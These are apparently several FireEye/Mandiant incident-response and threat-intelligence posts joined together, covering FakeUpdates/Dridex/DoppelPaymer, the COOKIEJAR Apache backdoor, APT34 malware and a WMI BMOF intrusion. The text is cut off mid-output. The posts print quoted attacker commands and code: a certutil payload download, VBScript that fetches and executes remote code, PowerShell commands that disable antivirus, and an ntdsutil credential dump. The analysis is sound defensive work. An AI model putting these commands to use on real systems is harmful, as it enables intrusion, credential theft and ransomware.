the user’s browser transparently navigate to a malicious website using hard-coded parameters. After victim browser information is gleaned, additional redirects are performed and the user is prompted to download a fake browser update. FireEye has observed that the browser validation sequence may have additional protections to evade sandbox detections and post-incident triage attempts on the compromise site(s). Figure 2: Example of FakeUpdate landing page after HTTP redirects The redirect process used numerous subdomains, with a limited number of IP addresses. The malicious subdomains are often changed in different parts of the initial redirects and browser validation stages. After clicking the ‘Update’ button, we observed the downloading of one of three types of files: Heavily-obfuscated HTML applications (.hta file extensions) JavaScript files (.js file extensions) ZIP-compressed JavaScript files (.zip extensions) Figure 3 provides a snippet of JavaScript that provides the initial download functionality. var domain = '//gnf6.ruscacademy[.]in/'; var statisticsRequest = 'wordpress/news.php?b=612626&m=ad2219689502f09c225b3ca0bfd8e333&y=206'; var statTypeParamName = 'st'; … var filename = 'download.hta'; var browser = 'Chrome'; var special = '1'; var filePlain = window.atob(file64); var a = document.getElementById('buttonDownload'); Figure 3: Excerpts of JavaScript code identified from the FakeUpdates landing pages When the user opens the initial FakeUpdates downloader, the Windows Scripting Host ( wscript.exe) is executed and the following actions are performed: A script is executed in memory and used to fingerprint the affected system. A subsequent backdoor or banking trojan is downloaded if the system is successfully fingerprinted. A script is executed in memory which: Downloads and launches a third party screenshot utility. Sends the captured screenshots to an attacker. The payload delivered in step 2 is subsequently executed by the script process. The backdoor and banking-trojan payloads described above have been identified as Dridex, NetSupport Manager RAT, AZOrult, and Chthonic malware. The strategy behind the selective payload delivery is unclear; however, the most prevalent malware delivered during this phase of the infection chain were variants of the Dridex backdoor. FakeUpdates: More like FakeHTTP After the end user executes the FakeUpdates download, the victim system will send a custom HTTP POST request to a hard-coded Command and Control (C2) server. The POST request, depicted in Figure 4, showed that the threat actors used a custom HTTP request for initial callback. The Age HTTP header, for example, was set to a string of 16 seemingly-random lowercase hexadecimal characters. Figure 4: Initial HTTP communication after successful execution of the FakeUpdates dropper The HTTP Age header typically represents the time in seconds since an object has been cached by a proxy. In this case, via analysis of the obfuscated code on disk, FireEye identified that the Age header correlates to a scripted “auth header” parameter; likely used by the C2 server to validate the request. The first HTTP POST request also contains an XOR-encoded HTTP payload variable “ a=” . The C2 server responds to the initial HTTP request with encoded JavaScript. When the code is decoded and subsequently executed, system and user information is collected using wscript.exe. The information collected from the victim system included: The malicious script that initialized the callback System hostname Current user account Active Directory domain Hardware details, such as manufacturer Anti-virus software details Running processes This activity is nearly identical to the steps observed in our April 2018 post, indicating only minor changes in data collection during this stage. For example, in the earlier iteration of this campaign, we did not observe the collection of the script responsible for the C2 communication. Following the system information gathering, the data is subsequently XOR-encoded and sent via another custom HTTP POST request request to the same C2 server, with the data included in the parameter “b=” . Figure 5 provides a snippet of sample of the second HTTP request. Figure 5: Second HTTP POST request after successful system information gathering Figure 6 provides a copy of the decoded content, showing the various data points the malware transmitted back to the C2 server. 0=500 1=C:\\Users\\User\\AppData\\Local\\Temp\\Chrome.js 2=AMD64 3=SYSTEM1 4=User 5=4 6=Windows_NT 7=DOMAIN 8=HP 9=HP EliteDesk 10=BIOS_VERSION 11=Windows Defender|Vendor Anti-Virus 12=Vendor Anti-Virus|Windows Defender| 13=00:00:00:00:00:00 14=Enhanced (101- or 102-key) 15=USB Input Device 16=1024x768 17=System Idle Process|System|smss.exe|csrss.exe|wininit.exe|csrss.exe| winlogon.exe|services.exe|lsass.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe| svchost.exe|spoolsv.exe|svchost.exe|svchost.exe|HPLaserJetService.exe|conhost.exe… Figure 6: Decoded system information gathered by the FakeUpdates malware After receiving the system information, the C2 server responds with an encoded payload delivered via chunked transfer-encoding to the infected system. This technique evades conventional IDS/IPS appliances, allowing for the second-stage payload to successfully download. During our investigations and FireEye Intelligence’s monitoring, we recovered encoded payloads that delivered one of the following: Dridex (Figure 7) NetSupport Manage Remote Access Tools (RATs) (Figure 8) Chthonic or AZORult (Figure 9) function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.Shell\"); wsh.Run('cmd /C rename \"' + _tempFilePathSave + '\" \"' + execFileName + '\"'); WScript.Sleep(3 * 1000); runFileResult = wsh.Run('\"' + _tempFilePathExec + '\"'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 7: Code excerpt observed in FakeUpdates used to launch Dridex payloads function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.Shell\"); runFileResult = wsh.Run('\"' + _tempFilePathExec + '\" /verysilent'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 8: Code excerpt observed in FakeUpdates used to launch NetSupport payloads function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.Shell\"); runFileResult = wsh.Run('\"' + _tempFilePathExec + '\"'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 9: Code excerpt observed in FakeUpdates used to launch Chthonic and AZORult payloads During this process, the victim system downloads and executes nircmdc.exe, a utility specifically used during the infection process to save two system screenshots. Figure 10 provides an example command used to capture the desktop screenshots. \"C:\\Users\\User\\AppData\\Local\\Temp\\nircmdc.exe\" savescreenshot \"C:\\Users\\User\\AppData\\Local\\Temp\\6206a2e3dc14a3d91.png\" Figure 10: Sample command used to executed the Nircmd tool to take desktop screenshots The PNG screenshots of the infected systems are then transferred to the C2 server, after which they are deleted from the system. Figure 11 provides an example of a HTTP POST request, again with the custom Age and User-Agent headers. Figure 11: Screenshots of the infected system are sent to an attacker-controlled C2 Interestingly, the screenshot file transfers were neither encoded nor obfuscated, as with other data elements transferred by the FakeUpdates malware. As soon as the screenshots are transferred, nircmdc.exe is deleted. All Hands on Deck In certain investigations, the incident was far from over. Following the distribution of Dridex v4 binaries (botnet IDs 199 and 501), new tools and frameworks began to appear. FireEye identified the threat actors leveraged their Dridex backdoor(s) to execute the publicly-available PowerShell Empire and/or Koadic post-exploitation frameworks. Managed Defense also identified the FakeUpdates to Dridex infection chain resulting in the download and execution of PoshC2, another publicly available tool. While it could be coincidental, it is worth noting that the use of PoshC2 was first observed in early September 2019 following the announcement that Empire would no longer be maintained and could represent a shift in attacker TTPs. These additional tools were often executed between 30 minutes and 2 hours after initial Dridex download. The pace of the initial phases of related attacks possibly suggests that automated post-compromise techniques are used in part before interactive operator activity occurs. We identified extensive usage of Empire and C2 communication to various servers during these investigations. For example, via process tracking, we identified a Dridex-injected explorer.exe executing malicious PowerShell: a clear sign of an Empire stager: Figure 12: An example of PowerShell Empire stager execution revealed during forensic analysis In the above example, the threat actors instructed the victim system to use the remote server 185.122.59[.]78 for command-and-control using an out-of-the-box Empire agent C2 configuration for TLS-encrypted backdoor communications. During their hands-on post-exploitation activity, the threat actors also moved laterally via PowerShell remoting and RDP sessions. FireEye identified the use of WMI to create remote PowerShell processes, subsequently used to execute Empire stagers on domain-joined systems. In one specific case, the time delta between initial Empire backdoor and successful lateral movement was under 15 minutes. Another primary goal for the threat actor was internal reconnaissance of both the local system and domain the computer was joined to. Figure 13 provides a snippet of Active Directory reconnaissance commands issued by the attacker during one of our investigations. Figure 13: Attacker executed commands The threat actors used an Empire module named SessionGopher and the venerable Mimikatz to harvest endpoint session and credential information. Finally, we also identified the attackers utilized Empire’s Invoke-EventVwrBypass, a Windows bypass technique used to launch executables using eventvwr.exe, as shown in Figure 14. \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x Figure 14: PowerShell event viewer bypass Ransomware Attacks & Operator Tactics Within these investigations, FireEye identified the deployment BitPaymer or DoppelPaymer ransomware. While these ransomware variants are highly similar, DoppelPaymer uses additional obfuscation techniques. It also has enhanced capabilities, including an updated network discovery mechanism and the requirement of specific command-line execution. DoppelPaymer also uses a different encryption and padding scheme. The ransomware and additional reconnaissance tools were downloaded through public sharing website repositories such as DropMeFiles and SendSpace. Irrespective of the ransomware deployed, the attacker used the SysInternals utlity PSEXEC to distribute and execute the ransomware. Notably, in the DoppelPaymer incident, FireEye identified that Dridex v2 with the Botnet ID 12333 was downloaded onto the same system previously impacted by an instance of Dridex v4 with Botnet ID 501. Within days, this secondary Dridex instance was then used to enable the distribution of DoppelPaymer ransomware.  Prior to DoppelPaymer, the threat actor deleted volume shadow copies and disabled anti-virus and anti-malware protections on select systems. Event log artifacts revealed commands executed through PowerShell which were used to achieve this step (Figure 15): Event Log EID Message Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Uninstall-WindowsFeature -Name Windows-Defender Application 1034 Windows Installer removed the product. Product Name: McAfee Agent-++-5.06.0011-++-1033-++-1603-++-McAfee, Inc.-++-(NULL)-++--++-. Product Version: 82. Figure 15: Event log entries related to the uninstallation of AV agents and disablement of real-time monitoring The DoppelPaymer ransomware was found in an Alternate Data Stream (ADS) in randomly named files on disk. ADSs are attributes within NTFS that allow for a file to have multiple data streams, with only the primary being visible in tools such as Windows Explorer. After ransomware execution, files are indicated as encrypted by being renamed with a “.locked” file extension. In addition to each “.locked” file, there is a ransom note with the file name “readme2unlock.txt” which provides instructions on how to decrypt files. Figure 16: DoppelPaymer ransomware note observed observed during a Mandiant Incident Response investigation Ransomware? Not In My House! Over the past few years, we have seen ransomware graduate from a nuisance malware to one being used to extort victim networks out of significant sums of money. Furthermore, threat actors are now coupling ransomware with multiple toolkits or other malware families to gain stronger footholds into an environment. In this blog post alone, we witnessed a threat actor move through multiple toolsets - some automated, some manual - with the ultimate goal of holding the victim organization hostage. Ransomware also raises the stakes for unprepared organizations as it levels the playing field for all areas of your enterprise. Ransomware proves that threat actors don’t need to get access to the most sensitive parts of your organization – they need to get access to the ones that will disrupt business processes. This widens your attack surface, but luckily, also gives you more opportunity for detection and response. Mandiant recently published an in depth white paper on Ransomware Protection and Containment Strategies , which may help organizations mitigate the risk of ransomware events.

                "text": "During a recent investigation at a telecommunications company led by Mandiant Managed Defense , our team was tasked with rapidly identifying systems that had been accessed by a threat actor using legitimate, but compromised domain credentials. This sometimes-challenging task was made simple because the customer had enabled the Logon Tracker module within their FireEye Endpoint Security product. Logon Tracker is an Endpoint Security Innovation Architecture module designed to simplify the investigation of lateral movement within Windows enterprise environments. Logon Tracker improves the efficiency of investigating lateral movement by aggregating historical logon activity and provides a mechanism to monitor for new activity. This data is presented in a user interface designed for analyzing investigative leads (e.g., a compromised account) and hunting for suspicious activity (e.g., RDP activity by privileged accounts). Logon Tracker also provides a graph interface that enables the identification of irregular and unique logons with the option to filter on hostnames, usernames, protocol, time of day, process name, privilege level, status (success/failure), and more. Figure 1: Logon Tracker GUI interface A critical component of a successful incident response is the scoping effort to identify systems that may have been accessed by the adversary. Windows Event Logs offer a commonly utilized method of identifying an adversary’s lateral movement between Windows systems. However, as with all log sources, Windows Event Logs are subject to data retention limits on endpoints, making the aggregated logon activity provided by Logon Tracker a critical source of evidence for incident response. Logon Tracker’s graphical display along with the raw logon events allowed Mandiant Managed Defense to quickly identify 10 potentially compromised hosts and begin to create a timeline of adversary activity. Managed Defense also leveraged Logon Tracker to monitor for additional suspicious logons and adversary activity throughout the incident response. Searching for logons (both failed and successful) from known compromised accounts and activity originating from compromised systems allowed our investigators to quickly determine which systems should be prioritized for analysis. Additionally, Logon Tracker provides investigators the ability to: Filter logon data for activity originating from user-provided IP ranges Search for logon data for activity by specific privileged accounts, including “Domain Administrators” and “Enterprise Administrators” Search for any privileged logon using the “Privileged” logon type Provide alerting and definition of custom rules (coming soon!) Case Background In mid-July, the Managed Defense Security Operations Center identified potential credential harvesting activity on a Windows server. The activity included the creation of a scheduled task configured to execute the built-in Windows utility, NTDSUTIL to take a snapshot of the active NTDS.dit file and save it locally to a text file as shown in Figure 2: \"schtasks  /s <redacted> /create /tn ntbackup /tr \\\"ntdsutil snapshot \\\\\\\"activate instance ntds\\\\\\\" create quit quit >c:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\ntds.log\\\" /sc once /st 05:38:00 /sd 07-12-2020 /f Figure 2: Scheduled task creation for NTDS.DIT harvesting The NTDS.dit file is a database that contains Active Directory data such as user objects, group memberships, groups, and—more useful to an adversary—password hashes for all users in the domain. Leveraging Logon Tracker and simple timeline analysis, Managed Defense quickly determined an adversary had accessed this system to create a scheduled task from a system with a hostname that did not match the naming convention used within the environment. An anonymized example of Logon Tracker data is shown in Figure 3: Figure 3: Logon Tracker data Armed with the suspicious hostname and potentially compromised username, Managed Defense then used Logon Tracker’s search functionality to determine the scope of systems potentially accessed by the adversary. The resulting investigation revealed that an Internet-facing Customer Relationship Management (CRM) application hosted on a Linux Apache web server had been compromised. Multiple web shells had been placed within web-accessible folders, allowing an adversary to execute arbitrary commands on the server. The adversary leveraged one of these web shells to install a malicious Apache module and restart Apache for the module to take effect. Mandiant has classified this module as COOKIEJAR (see the Malware Appendix at the end of the post for more details). The COOKIEJAR module enabled the adversary to proxy through the compromised server to any arbitrary IP/port pair within the customer’s internal network, see Figure 4. Figure 4: PCAP data Using this proxied access to the customer’s network, the adversary leveraged previously compromised domain credentials to connect to multiple Windows servers using SMB. Due to the use of the proxy to connect into the customer’s network, the hostname of the adversary’s workstation being used to conduct the attack was also passed into the logon events. This type of activity occurs due to the direct connection to the customers network and is similar to being on the same LAN. The non-standard hostname and non-standard customer naming convention used by the adversary help make scoping an easy task. Additionally, Managed Defense was able to leverage network detection to alert on the authentication attempts and activities of the adversary’s host. Malware Appendix During the course of the response, Mandiant identified a customized malicious Apache plugin capable of intercepting HTTP requests to an Apache HTTP server. The new malware family COOKIEJAR was created to aid in clustering and tracking this activity. The COOKIEJAR module installs a pre-connection hook that only runs if the client IP address matches a specified hardcoded adversary-controlled IP address. It listens for SSL/TLS connections on the port specified by the Apache server, using a certificate and private key loaded from /tmp/cacert.pem and /tmp/privkey.pem respectively. If the client IP address matches the hardcoded IP address (Figure 4), the backdoor accepts three commands based on the start of the URL: /phpconf_t/: Simply writes <html><h1>accepted.</h1></html> as the response. Likely used to test if the server is infected with the malware. /phpconf_s/: Executes commands on the server. Any communications to and from the system are forwarded to a shell, and are AES-256-ECB encrypted and then Base58 encoded. /phpconf_p/: Decode the second encoded string provided as a hostname/port (the first is ignored), using Base58 and AES-256-ECB (same key as before). The server will connect to the remote host and act as a proxy for the command and control (C2). Data to and from the C2 is encoded using Base58 and AES-256-ECB. Data to and from the remote host is not encoded.

                "text": "Background With increasing geopolitical tensions in the Middle East, we expect Iran to significantly increase the volume and scope of its cyber espionage campaigns. Iran has a critical need for strategic intelligence and is likely to fill this gap by conducting espionage against decision makers and key organizations that may have information that furthers Iran's economic and national security goals. The identification of new malware and the creation of additional infrastructure to enable such campaigns highlights the increased tempo of these operations in support of Iranian interests. FireEye Identifies Phishing Campaign In late June 2019, FireEye identified a phishing campaign conducted by APT34, an Iranian-nexus threat actor. Three key attributes caught our eye with this particular campaign: Masquerading as a member of Cambridge University to gain victims’ trust to open malicious documents, The usage of LinkedIn to deliver malicious documents, The addition of three new malware families to APT34’s arsenal. FireEye’s platform successfully thwarted this attempted intrusion, stopping a new malware variant dead in its tracks. Additionally, with the assistance of our FireEye Labs Advanced Reverse Engineering (FLARE), Intelligence, and Advanced Practices teams, we identified three new malware families and a reappearance of PICKPOCKET, malware exclusively observed in use by APT34. The new malware families, which we will examine later in this post, show APT34 relying on their PowerShell development capabilities, as well as trying their hand at Golang. APT34 is an Iran-nexus cluster of cyber espionage activity that has been active since at least 2014. They use a mix of public and non-public tools to collect strategic information that would benefit nation-state interests pertaining to geopolitical and economic needs. APT34 aligns with elements of activity reported as OilRig and Greenbug, by various security researchers. This threat group has conducted broad targeting across a variety of industries operating in the Middle East; however, we believe APT34's strongest interest is gaining access to financial, energy, and government entities. Additional research on APT34 can be found in this FireEye blog post , this CERT-OPMD post , and this Cisco post . Mandiant Managed Defense also initiated a Community Protection Event (CPE) titled “Geopolitical Spotlight: Iran.” This CPE was created to ensure our customers are updated with new discoveries, activity and detection efforts related to this campaign, along with other recent activity from Iranian-nexus threat actors to include APT33, which is mentioned in this updated FireEye blog post . Industries Targeted The activities observed by Managed Defense, and described in this post, were primarily targeting the following industries: Energy and Utilities Government Oil and Gas Utilizing Cambridge University to Establish Trust On June 19, 2019, Mandiant Managed Defense Security Operations Center received an exploit detection alert on one of our FireEye Endpoint Security appliances. The offending application was identified as Microsoft Excel and was stopped immediately by FireEye Endpoint Security’s ExploitGuard engine. ExploitGuard is our behavioral monitoring, detection, and prevention capability that monitors application behavior, looking for various anomalies that threat actors use to subvert traditional detection mechanisms. Offending applications can subsequently be sandboxed or terminated, preventing an exploit from reaching its next programmed step. The Managed Defense SOC analyzed the alert and identified a malicious file named System.doc (MD5: b338baa673ac007d7af54075ea69660b) , located in C:\\Users\\<user_name>\\.templates . The file System.doc is a Windows Portable Executable (PE), despite having a \"doc\" file extension. FireEye identified this new malware family as TONEDEAF. A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution. When executed, this variant of TONEDEAF wrote encrypted data to two temporary files – temp.txt and temp2.txt – within the same directory of its execution. We explore additional technical details of TONEDEAF in the malware appendix of this post. Retracing the steps preceding exploit detection, FireEye identified that System.doc was dropped by a file named ERFT-Details.xls . Combining endpoint- and network-visibility, we were able to correlate that ERFT-Details.xls originated from the URL http://www.cam-research-ac[.]com/Documents/ERFT-Details.xls . Network evidence also showed the access of a LinkedIn message directly preceding the spreadsheet download. Managed Defense reached out to the impacted customer’s security team, who confirmed the file was received via a LinkedIn message. The targeted employee conversed with \"Rebecca Watts\", allegedly employed as \"Research Staff at University of Cambridge\". The conversation with Ms. Watts, provided in Figure 1, began with the solicitation of resumes for potential job opportunities. Figure 1: Screenshot of LinkedIn message asking to download TONEDEAF This is not the first time we’ve seen APT34 utilize academia and/or job offer conversations in their various campaigns. These conversations often take place on social media platforms, which can be an effective delivery mechanism if a targeted organization is focusing heavily on e-mail defenses to prevent intrusions. FireEye examined the original file ERFT-Details.xls , which was observed with at least two unique MD5 file hashes: 96feed478c347d4b95a8224de26a1b2c caf418cbf6a9c4e93e79d4714d5d3b87 A snippet of the VBA code, provided in Figure 2, creates System.doc in the target directory from base64-encoded text upon opening. Figure 2: Screenshot of VBA code from System.doc The spreadsheet also creates a scheduled task named \"windows update check\" that runs the file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute. Upon closing the spreadsheet, a final VBA function will rename System.doc to System Manager.exe . Figure 3 provides a snippet of VBA code that creates the scheduled task, clearly obfuscated to avoid simple detection. Figure 3: Additional VBA code from System.doc Upon first execution of TONEDEAF, FireEye identified a callback to the C2 server offlineearthquake[.]com over port 80. The FireEye Footprint: Pivots and Victim Identification After identifying the usage of offlineearthquake[.]com as a potential C2 domain, FireEye’s Intelligence and Advanced Practices teams performed a wider search across our global visibility. FireEye’s Advanced Practices and Intelligence teams were able to identify additional artifacts and activity from the APT34 actors at other victim organizations. Of note, FireEye discovered two additional new malware families hosted at this domain, VALUEVAULT and LONGWATCH. We also identified a variant of PICKPOCKET, a browser credential-theft tool FireEye has been tracking since May 2018, hosted on the C2. Requests to the domain offlineearthquake[.]com could take multiple forms, depending on the malware’s stage of installation and purpose. Additionally, during installation, the malware retrieves the system and current user names, which are used to create a three-character “sys_id”. This value is used in subsequent requests, likely to track infected target activity. URLs were observed with the following structures: hxxp[://]offlineearthquake[.]com/download?id=<sys_id>&n=000 hxxp[://]offlineearthquake[.]com/upload?id=<sys_id>&n=000 hxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&h=000 hxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&n=000 The first executable identified by FireEye on the C2 was WinNTProgram.exe (MD5: 021a0f57fe09116a43c27e5133a57a0a) , identified by FireEye as LONGWATCH. LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp folder. Further information regarding LONGWATCH is detailed in the Malware Appendix section at the end of the post. FireEye Network Security appliances also detected the following being retrieved from APT34 infrastructure (Figure 4). GET hxxp://offlineearthquake.com/file/<sys_id>/b.exe?id=<3char_redacted>&n=000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) AppleWebKit/537.36 (KHTML, like Gecko) Host: offlineearthquake[.]com Proxy-Connection: Keep-Alive Pragma: no-cache HTTP/1.1 Figure 4: Snippet of HTTP traffic retrieving VALUEVAULT; detected by FireEye Network Security appliance FireEye identifies b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT. VALUEVAULT is a Golang compiled version of the \"Windows Vault Password Dumper\" browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel. VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. Further information regarding VALUEVAULT can be found in the appendix below. Further pivoting from FireEye appliances and internal data sources yielded two additional files, PE86.dll (MD5: d8abe843db508048b4d4db748f92a103) and PE64.dll (MD5: 6eca9c2b7cf12c247032aae28419319e) . These files were analyzed and determined to be 64- and 32-bit variants of the malware PICKPOCKET, respectively. PICKPOCKET is a credential theft tool that dumps the user's website login credentials from Chrome, Firefox, and Internet Explorer to a file. This tool was previously observed during a Mandiant incident response in 2018 and, to date, solely utilized by APT34. Conclusion The activity described in this blog post presented a well-known Iranian threat actor utilizing their tried-and-true techniques to breach targeted organizations. Luckily, with FireEye’s platform in place, our Managed Defense customers were not impacted. Furthermore, upon the blocking of this activity, FireEye was able to expand upon the observed indicators to identify a broader campaign, as well as the use of new and old malware. We suspect this will not be the last time APT34 brings new tools to the table. Threat actors are often reshaping their TTPs to evade detection mechanisms, especially if the target is highly desired. For these reasons, we recommend organizations remain vigilant in their defenses, and remember to view their environment holistically when it comes to information security.

Malware Appendix TONEDEAF TONEDEAF is a backdoor that communicates with Command and Control servers using HTTP or DNS. Supported commands include system information collection, file upload, file download, and arbitrary shell command execution. Although this backdoor was coded to be able to communicate with DNS requests to the hard-coded Command and Control server, c[.]cdn-edge-akamai[.]com, it was not configured to use this functionality. Figure 5 provides a snippet of the assembly CALL instruction of dns_exfil. The creator likely made this as a means for future DNS exfiltration as a plan B. Figure 5: Snippet of code from TONEDEAF binary Aside from not being enabled in this sample, the DNS tunneling functionality also contains missing values and bugs that prevent it from executing properly. One such bug involves determining the length of a command response string without accounting for Unicode strings. As a result, a single command response byte is sent when, for example, the malware executes a shell command that returns Unicode output. Additionally, within the malware, an unused string contained the address 185[.]15[.]247[.]154. VALUEVAULT VALUEVAULT is a Golang compiled version of the “Windows Vault Password Dumper” browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel. VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. A snippet of this function is shown in Figure 6. powershell.exe /c \"function get-iehistory {. [CmdletBinding()]. param (). . $shell = New-Object -ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. . $hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items() | . foreach {. $site = $_. . if ($site.IsFolder) {. $pageFolder = $site.GetFolder. $pageFolder.Items() | . foreach {. $visit = New-Object -TypeName PSObject -Property @{ . URL = $($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }. }. }. get-iehistory Figure 6: Snippet of PowerShell code from VALUEVAULT to extract browser credentials Upon execution, VALUEVAULT creates a SQLITE database file in the AppData\\Roaming directory under the context of the user account it was executed by. This file is named fsociety.dat and VALUEVAULT will write the dumped passwords to this in SQL format. This functionality is not in the original version of the “Windows Vault Password Dumper”. Figure 7 shows the SQL format of the fsociety.dat file. Figure 7: SQL format of the VALUEVAULT fsociety.dat SQLite database VALUEVAULT’s function names are not obfuscated and are directly reviewable in strings analysis. Other developer environment variables were directly available within the binary as shown below. VALUEVAULT does not possess the ability to perform network communication, meaning the operators would need to manually retrieve the captured output of the tool.

FireEye identifies this malware as LONGWATCH. The primary function of LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Windows temp folder. Interesting strings identified in the binary are shown in Figure 9.

Additionally, patching complex software environments while keeping the business operational makes it difficult to keep pace with attackers exploiting vulnerabilities, especially when these truths are coupled with rapid exploitation with innovative obfuscation methods utilizing the operating systems own feature set against it. Everybody’s Working for the Recon While monitoring our customers around the clock, FireEye Managed Defense identified suspicious file write activity on a system at a European manufacturing client and began our initial investigation by collecting the available volatile and non-volatile data from the affected host. Once evidence collection had completed, we began parsing the forensic data using the parsers available in FireEye's free Redline forensic analysis tool. Analysis of the logs quickly revealed that there were commands executed on the host which were consistent with interactive reconnaissance activity. Typically, once a host has successfully been compromised, attackers are presented with a command shell window which allows them to run commands on the host. These commands can consist of reconnaissance activity which expose useful information about the host to the attacker. The following is a snippet of the commands that we observed successfully executed on the host: ipconfig.exe ipconfig /all whoami.exe whoami The associated parent process that handled execution of the aforementioned listed processes was: \"\\Weaver\\jdk_new\\bin\\javaw.exe\". FOMBs AWAY! Once the attackers gained access to the web server by exploiting an unknown vulnerability, they attempted to further pivot control within the system through the use of Windows Management Instrumentation (WMI). They leveraged WMI's execution process, which takes Managed Object Format (MOF) files as input and compiles them into the WMI buffer, resulting in a compiled “.bmf” output file. The attackers wrote their second-stage payload and compiled it with WMI. Finally, they uploaded the compiled “.bmf” file to their web server and modified the file to masquerade as a \".rar\" file . Upon further assessment of the activity, we observed that after the threat actors gained access to the affected web server, they utilized a Windows native binary called “Certutil.exe” to download malicious code from a remote resource . Our investigation revealed that an instance of the process “Certutil.exe” was executed with the following command line arguments: certutil  -urlcache -split -f http://[DOMAIN]/uploads/180307/l.rar c:\\windows\\temp\\l.rar Options Description -urlcache Display or delete URL cache entries -split Split embedded ASN.1 elements, and save to files -f Force overwrite (Source: Microsoft certutil page ) FireEye has observed this methodology executed numerous times by both ethical hackers and unauthorized threat actors in addition to Certutil’s benign use as a part of legitimate business applications and operations. Shortly after the second-stage payload was downloaded, we observed several file write events related to `l.rar` (MD5: 4084eb4a41e3a01db2fe6f0b91064afa). Of particular note were: cmd.exe  cmd /c mofcomp.exe C:\\Windows\\temp\\l.rar cmd.exe cmd /c del C:\\Windows\\temp\\l.rar The aforementioned commands utilize Window's \"cmd.exe\" interpreter to run \"mofcomp.exe\" on the newly obtained \"l.rar\". This process is designed to parse a file containing MOF statements and add any class and class instances defined in the file to the WMI repository , and subsequently delete the aforementioned file. The use of “mofcomp.exe” for attackers and defenders was first proposed at MIRcon 2014 by FireEye Mandiant incident responders Christopher Glyer and Devon Kerr in their “There’s Something about WMI” talk (Figure 1). Figure 1: Proposed use of MOF files for red and blue teams We obtained the file \"l.rar\" for further analysis and observed that the file header began with \"FOMB\". This file header when conveniently flipped is \"BMOF\", as in Binary Managed Object Format. With this information in hand we began searching for methods to reverse the compiled binary. Upon analyzing the file in FireEye's sandbox environment, we were able to obtain the following information from the BMOF file: On Error Resume Next:execmydler():Function execmydler():Set P=CreateObject(\"WinHttp.WinHttpRequest.5.1\"):P[.]Open \"GET\",\"hxxp[://[DOMAIN]/d/dl[.]asp\",0:P[.]Send():b=P[.]responseText:M=Spli t(b,\",\",-1,1):For Each Od In M:Nd=Nd+Chr(Od- 2):Next:Set P=Nothing:If Len(Nd) > 10 Then:Execute(Nd):End If:End In an attempt to masquerade activities, the attackers wrote an MOF script and compiled it into a BMOF file, then ran the malicious BMOF file on the victim machine via WMI. The aforementioned code attempts to download a second-stage payload from \"hxxp[://[DOMAIN]/d/dl[.]asp\" when executed. Since the WMI buffer is involved, this attack vector opens the door to gaining a persistent foothold in the victim environment. During this research period we also found an open-sourced project titled \"bmfdec\" that also decompiled BMOF files. Uncovering the Exploit The attackers were active on September 22, and as such the majority of the investigation was conducted around this timeframe. Analysis of FireEye Endpoint Security ring buffer events uncovered reconnaissance commands executed on the system including whoami , ipconfig and the downloading of additional binaries. However, further analysis of the system did not uncover an initial exploit within the same timeframe of these commands. Analysis of the HTTP logs also did not uncover the initial payload. Within the HTTP logs we identified suspicious HTTP POST requests including requests to ’/weaver/bsh.servlet.BshServlet/` , but this was a busy server and the payload was not included in the logging, only metadata. Example HTTP log entry '-` 2886000` 10.10.10.10` -` -` \"[23/Sep/2019:10:10:10 +0800]\"` \"POST /weaver/bsh.servlet.BshServlet/ HTTP/1.1\"`  \"-\"' FireEye Endpoint Security has the ability to collect a memory image and this was completed on the same day as the initial activity. As memory is volatile, the earlier it's collected in an investigation the more likely you are to uncover additional evidence. We used Volatility to analyze the memory image looking for any suspicious event log entries, process creation, registry entries, etc. While reviewing the memory image, we identified numerous instances of mshta.exe spawned under javaw.exe , the creation date for these processes was 2019-09-20, and we pivoted our investigative focus to that date. .. httpd.exe            2388    604      3     84 2019-06-28 09:32:53 UTC+0000 ... java.exe            2420   2388      0 ------ 2019-06-28 09:32:53 UTC+0000 .... javaw.exe          4804   2420     36    530 2019-06-28 09:33:19 UTC+0000 ..... javaw.exe         5976   4804    177   4925 2019-06-28 09:33:21 UTC+0000 ...... mshta.exe       17768   5976     12    320 2019-09-20 14:20:00 UTC+0000 ...... mshta.exe        9356   5976     12    306 2019-09-20 11:12:04 UTC+0000 ...... mshta.exe       22416   5976     12    310 2019-09-20 11:31:14 UTC+0000 ...... mshta.exe       23240   5976     13    318 2019-09-20 14:20:01 UTC+0000 ...... mshta.exe       15116   5976     12    311 